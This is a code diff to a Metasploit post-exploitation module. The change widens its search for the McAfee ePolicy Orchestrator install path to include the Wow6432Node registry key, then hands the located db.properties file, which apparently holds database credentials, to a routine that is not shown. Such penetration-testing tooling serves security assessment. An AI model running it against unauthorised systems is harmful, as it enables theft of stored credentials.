@@ -31,20 +31,37 @@ class Metasploit3 < Msf::Post
   def run
     # Find out where things are installed
     print_status("Finding Tomcat install path...")
-    subkeys = registry_enumkeys("HKLM\\Software\\Network Associates\\ePolicy Orchestrator")
-    if subkeys.nil? or subkeys.empty?
+  
+    # Check both normal and Wow6432Node keys
+    subkeys = 
+      [
+        'HKLM\\Software\\Network Associates\\ePolicy Orchestrator',
+        'HKLM\\Software\\Wow6432Node\\Network Associates\\ePolicy Orchestrator'
+      ]
+
+    epol_reg_keys = []
+    subkeys.each do |subkey|
+      key = registry_enumkeys(subkey)
+      if not key.nil?
+        epol_reg_keys.push(subkey)
+      end
+    end
+
+    if (epol_reg_keys.nil? or epol_reg_keys.empty?)
       print_error ("ePO 4.6 Not Installed or No Permissions to RegKey")
       return
     end
+
     # Get the db.properties file location
-    epol_reg_key = "HKLM\\Software\\Network Associates\\ePolicy Orchestrator"
-    dbprops_file = registry_getvaldata(epol_reg_key, "TomcatFolder")
-    if dbprops_file == nil or dbprops_file == ""
-      print_error("Could not find db.properties file location")
-    else
-      dbprops_file << "/conf/orion/db.properties";
-      print_good("Found db.properties location");
-      process_config(dbprops_file);
+    epol_reg_keys.each do |epol_reg_key|
+      dbprops_file = registry_getvaldata(epol_reg_key, "TomcatFolder")
+      if dbprops_file == nil or dbprops_file == ""
+        print_error("Could not find db.properties file location")
+      else
+        dbprops_file << "/conf/orion/db.properties";
+        print_good("Found db.properties location");
+        process_config(dbprops_file);
+      end
     end
   end
 
